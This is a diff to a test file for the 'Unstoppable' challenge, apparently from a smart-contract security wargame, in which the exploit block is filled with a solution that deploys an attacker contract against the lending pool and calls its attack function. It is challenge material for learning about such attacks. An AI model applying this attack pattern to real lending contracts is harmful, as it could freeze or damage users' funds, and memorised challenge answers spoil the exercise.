@@ -9,12 +9,13 @@ describe('[Challenge] Unstoppable', function () {
     const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');
 
     before(async function () {
+        this.timeout(2000);
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
 
         [deployer, attacker, someUser] = await ethers.getSigners();
 
-        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
+        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
 
         this.token = await DamnValuableTokenFactory.deploy();
         this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
@@ -39,7 +40,11 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const AttackerFactory = await ethers.getContractFactory('UnstoppableAttacker', deployer);
+        const attackerContract = await AttackerFactory.deploy(this.pool.address);
+        await this.token.connect(attacker).transfer(attackerContract.address, 1);
+        await attackerContract.connect(attacker).attack(10)
+
     });
 
     after(async function () {
